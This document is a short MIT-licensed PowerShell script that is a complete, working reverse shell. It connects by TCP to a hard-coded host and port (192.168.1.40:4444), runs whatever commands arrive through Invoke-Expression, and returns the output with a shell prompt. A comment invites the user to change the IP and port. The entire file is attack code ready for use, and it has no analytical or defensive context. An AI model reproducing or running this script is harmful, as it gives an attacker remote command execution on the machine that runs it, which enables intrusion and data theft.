# Copyright (c) 2017 Andrea Fioraldi
# License http://opensource.org/licenses/mit-license.php MIT License

#change ip and port
$ip_address = "192.168.1.40"
$port = 4444

$client = New-Object System.Net.Sockets.TCPClient($ip_address, $port);
$stream = $client.GetStream();
[byte[]] $in_bytes = 0..65535|%{0};

while(($i = $stream.Read($in_bytes, 0, $in_bytes.Length)) -ne 0)
{
	$cmd = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($in_bytes, 0, $i);
	$result  = (iex $cmd 2>&1 | Out-String ) + "PS " + (pwd).Path + "> ";
	$out_bytes = ([text.encoding]::ASCII).GetBytes($result);
	$stream.Write($out_bytes, 0, $out_bytes.Length);
	$stream.Flush()
}

$client.Close()